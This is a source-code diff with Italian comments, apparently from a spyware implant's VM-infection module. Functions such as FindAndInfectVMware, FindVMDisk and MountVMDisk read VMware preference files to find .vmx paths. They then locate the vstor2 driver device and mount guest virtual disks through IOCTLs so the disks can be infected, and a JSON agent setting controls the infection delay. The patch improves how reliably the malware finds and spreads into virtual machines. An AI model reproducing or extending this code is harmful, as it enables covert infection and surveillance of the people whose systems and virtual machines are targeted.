@@ -706,6 +706,9 @@ struct _ioctl_dismount
     unsigned long    dw6;    
 };
 
+
+extern WCHAR *UTF8_2_UTF16(char *str);
+	
 // Cerca una drive letter libera
 char *FindFreeDriveLetter()
 {
@@ -788,11 +791,48 @@ DWORD FindDiskID(HANDLE hfile, char *disk_path)
 	return 0;
 }
 
+BOOL FindVStoreDevice(WCHAR *dev_store)
+{
+	DWORD dummy;
+	LPVOID *drivers;
+	DWORD cbNeeded = 0;
+	int cDrivers, i;
+
+	FNC(EnumDeviceDrivers)((LPVOID *)&dummy, sizeof(dummy), &cbNeeded);
+	if (cbNeeded == 0)
+		return FALSE;
+	if (!(drivers = (LPVOID *)malloc(cbNeeded)))
+		return FALSE;
+
+	if( FNC(EnumDeviceDrivers)(drivers, cbNeeded, &dummy) ) { 
+		WCHAR szDriver[1024];
+		cDrivers = cbNeeded/sizeof(LPVOID);
+		for (i=0; i < cDrivers; i++ ) {
+			if(FNC(GetDeviceDriverBaseNameW)(drivers[i], szDriver, sizeof(szDriver)/sizeof(szDriver[0]))) { 
+				if (!_wcsnicmp(szDriver, L"vstor2-", wcslen(L"vstor2-"))) {
+					WCHAR *ptr;
+					if(ptr = wcschr(szDriver, L'.')) {
+						*ptr = 0;
+						_snwprintf_s(dev_store, MAX_PATH, _TRUNCATE, L"\\\\.\\%s", szDriver);		
+						free(drivers);
+						return TRUE;
+					}
+					free(drivers);
+					return FALSE;
+				}
+			}
+		}
+	}
+	free(drivers);
+	return FALSE;
+}
+
 // Monta un disco virtuale
 BOOL MountVMDisk(char *disk_path, char *drive_letter, DWORD *volume_id)
 {
 	HANDLE hfile;
 	char reply[0x3FDC];
+	WCHAR vstore[MAX_PATH];
 	_ioctl_vstor msg;
 	DWORD dummy;
 
@@ -812,7 +852,9 @@ BOOL MountVMDisk(char *disk_path, char *drive_letter, DWORD *volume_id)
 	strcpy((char *) msg.Path, disk_path);
 
 	// Manda la ioctl per montare il disco
-	hfile = CreateFileA("\\\\.\\vstor2-ws60", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
+	if (!FindVStoreDevice(vstore))
+		return FALSE;
+	hfile = CreateFileW(vstore, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
 	if (hfile == INVALID_HANDLE_VALUE) 
 		return FALSE;
 
@@ -831,6 +873,7 @@ BOOL UnmountVMDisk(char *disk_path, DWORD volume_id)
 {
 	HANDLE hfile;
 	char reply[0x3FDC];
+	WCHAR vstore[MAX_PATH];
 	_ioctl_dismount msg;
 	DWORD dummy;
 
@@ -843,8 +886,10 @@ BOOL UnmountVMDisk(char *disk_path, DWORD volume_id)
     msg.VolumeID = volume_id;
     msg.dw6 = 0x01;
 
-	// Manda la ioctl per montare il disco
-	hfile = CreateFileA("\\\\.\\vstor2-ws60", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
+	// Manda la ioctl per smontare il disco
+	if (!FindVStoreDevice(vstore))
+		return FALSE;
+	hfile = CreateFileW(vstore, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
 	if (hfile == INVALID_HANDLE_VALUE) 
 		return FALSE;
 
@@ -927,10 +972,15 @@ void FindVMDisk(char *conf_path)
 	char *config_map, *ptr, *ptr_end;
 	char *local_config_map;
 	char disk_path[MAX_PATH];
+	WCHAR *w_path;
 
 	// Mappa in memoria il file di config
-	if ((hFile = FNC(CreateFileA)(conf_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+	w_path = UTF8_2_UTF16(conf_path);
+	if (!w_path)
 		return;
+	if ((hFile = FNC(CreateFileW)(w_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+		return;
+	SAFE_FREE(w_path);
 	
 	config_size = GetFileSize(hFile, NULL);
 	if (config_size == INVALID_FILE_SIZE) {
@@ -1024,45 +1074,19 @@ void FindAndInfectVMware()
 		memcpy(local_config_map, config_map, config_size);
 		FNC(UnmapViewOfFile)(config_map);
 
-		// Parsa per VMWare workstation
-		for (i=0;; i++) {
-			sprintf(obj_string, "pref.ws.openedObj%d.", i);
-			ptr = strstr(local_config_map, obj_string);
-			if (!ptr)
-				break;
-
-			sprintf(obj_string, "pref.ws.openedObj%d.file = \"", i);
-			if (ptr = strstr(ptr, obj_string)) {
-				ptr += strlen(obj_string);
-				ptr_end = strchr(ptr, '"');
-				if (ptr_end) {
-					*ptr_end = 0;
-					// Per ogni macchina trovata, cerca il disco virtuale corrispondente
-					FindVMDisk(ptr);	
-					*ptr_end = '"';
-				}
+		// Parsa per cercare i vmx
+		ptr_end = local_config_map;
+		while (ptr = strstr(ptr_end, ".vmx\"")) {
+			ptr_end = ptr + strlen(".vmx");
+			*ptr_end = NULL;
+			for(;*ptr!='"' && ptr!=local_config_map; ptr--);
+			if (*ptr == '"') {
+				ptr++;
+				// Per ogni macchina trovata, cerca il disco virtuale corrispondente
+				FindVMDisk(ptr);	
 			}
-		}
-
-		// Parsa per VMWare Player
-		for (i=0;; i++) {
-			sprintf(obj_string, "pref.mruVM%d.", i);
-			ptr = strstr(local_config_map, obj_string);
-			if (!ptr)
-				break;
-
-			sprintf(obj_string, "pref.mruVM%d.filename = \"", i);
-			if (ptr = strstr(ptr, obj_string)) {
-				ptr += strlen(obj_string);
-				ptr_end = strchr(ptr, '"');
-				if (ptr_end) {
-					*ptr_end = 0;
-					// Per ogni macchina trovata, cerca il disco virtuale corrispondente
-					FindVMDisk(ptr);	
-					*ptr_end = '"';
-				}
-			}
-		}
+			*ptr_end = '"';
+		}	
 	}
 	SAFE_FREE(local_config_map);
 	CloseHandle(hMap);
@@ -1185,7 +1209,7 @@ DWORD __stdcall PM_PDAAgentInit(JSONObject elem)
 	temp = (DWORD) elem[L"vm"]->AsNumber();
 	if (temp!=0) {
 		infection_vm = TRUE;
-		vm_delay = temp;
+		vm_delay = temp * 1000;
 	} else 
 		infection_vm = FALSE;
 	
